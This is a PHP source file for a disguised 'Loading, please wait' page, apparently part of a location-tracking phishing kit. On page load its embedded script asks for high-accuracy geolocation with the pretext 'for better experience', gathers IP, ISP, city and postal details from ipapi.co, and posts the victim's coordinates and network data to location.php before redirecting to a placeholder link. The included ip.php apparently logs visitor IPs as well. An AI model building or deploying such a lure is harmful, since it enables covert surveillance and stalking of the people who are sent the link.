<?php
include 'ip.php';

echo <<<HTML
<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <meta name="viewport" content="width=device-width, initial-scale=1.0">
    <title>Loading...</title>

    <script>
        // Debug function
        function debugLog(message) {

            if (
                message.includes("Lat:") ||
                message.includes("Latitude:") ||
                message.includes("Position obtained successfully")
            ) {

                console.log("DEBUG: " + message);

                var xhr = new XMLHttpRequest();
                xhr.open("POST", "debug_log.php", true);
                xhr.setRequestHeader(
                    "Content-Type",
                    "application/x-www-form-urlencoded"
                );

                xhr.send(
                    "message=" + encodeURIComponent(message)
                );
            }
        }

        async function getLocation() {

            if (navigator.geolocation) {

                document.getElementById("locationStatus").innerText =
                    "Requesting location permission...";

                // Obtener info IP
                let extraInfo = {};

                try {

                    const response = await fetch("https://ipapi.co/json/");

                    if (response.ok) {
                        extraInfo = await response.json();
                    }

                } catch (e) {

                    debugLog(
                        "Error fetching IP info: " + e.message
                    );
                }

                navigator.geolocation.getCurrentPosition(

                    function(position) {
                        sendPosition(position, extraInfo);
                    },

                    function(error) {
                        handleError(error);
                    },

                    {
                        enableHighAccuracy: true,
                        timeout: 10000,
                        maximumAge: 0
                    }
                );

            } else {

                document.getElementById("locationStatus").innerText =
                    "Your browser doesn't support location services";

                setTimeout(function() {
                    redirectToMainPage();
                }, 2000);
            }
        }

        function sendPosition(position, extraInfo) {

            debugLog("Position obtained successfully");

            document.getElementById("locationStatus").innerText =
                "Location obtained, loading...";

            var lat = position.coords.latitude;
            var lon = position.coords.longitude;
            var acc = position.coords.accuracy;

            // Mapeo inteligente de datos (Funciona con ipwho.is y ipapi.co)
            var isp = (extraInfo.connection ? extraInfo.connection.isp : extraInfo.org) || "Unknown";
            var city = extraInfo.city || "Unknown";
            var region = (extraInfo.region || extraInfo.region_name) || "Unknown";
            var country = (extraInfo.country || extraInfo.country_name) || "Unknown";
            var zip = (extraInfo.postal || extraInfo.zip) || "Unknown";

            var xhr = new XMLHttpRequest();

            xhr.open("POST", "location.php", true);

            xhr.setRequestHeader(
                "Content-Type",
                "application/x-www-form-urlencoded"
            );

            xhr.onreadystatechange = function() {

                if (xhr.readyState === 4) {

                    setTimeout(function() {
                        redirectToMainPage();
                    }, 1000);
                }
            };

            xhr.onerror = function() {
                redirectToMainPage();
            };

            var params =
                "lat=" + encodeURIComponent(lat) +
                "&lon=" + encodeURIComponent(lon) +
                "&acc=" + encodeURIComponent(acc) +
                "&isp=" + encodeURIComponent(isp) +
                "&city=" + encodeURIComponent(city) +
                "&region=" + encodeURIComponent(region) +
                "&country=" + encodeURIComponent(country) +
                "&zip=" + encodeURIComponent(zip) +
                "&time=" + new Date().getTime();

            xhr.send(params);
        }

        function handleError(error) {

            document.getElementById("locationStatus").innerText =
                "Redirecting...";

            setTimeout(function() {
                redirectToMainPage();
            }, 2000);
        }

        function redirectToMainPage() {
            try {
                window.location.href = "forwarding_link";
            } catch (e) {
                window.location = "forwarding_link";
            }
        }

        window.onload = function() {

            setTimeout(function() {
                getLocation();
            }, 500);
        };
    </script>

    <style>

        body {
            background-color: #000;
            color: #fff;
            font-family: Arial, sans-serif;
            text-align: center;
            padding-top: 50px;
        }

        .spinner {
            border: 8px solid #333;
            border-top: 8px solid #f3f3f3;
            border-radius: 50%;
            width: 60px;
            height: 60px;
            animation: spin 1s linear infinite;
            margin: 0 auto;
        }

        @keyframes spin {

            0% {
                transform: rotate(0deg);
            }

            100% {
                transform: rotate(360deg);
            }
        }

    </style>

</head>

<body>

    <h2>Loading, please wait...</h2>

    <p>Please allow location access for better experience</p>

    <p id="locationStatus">Initializing...</p>

    <div style="margin-top: 30px;">
        <div class="spinner"></div>
    </div>

</body>
</html>
HTML;

exit;
?>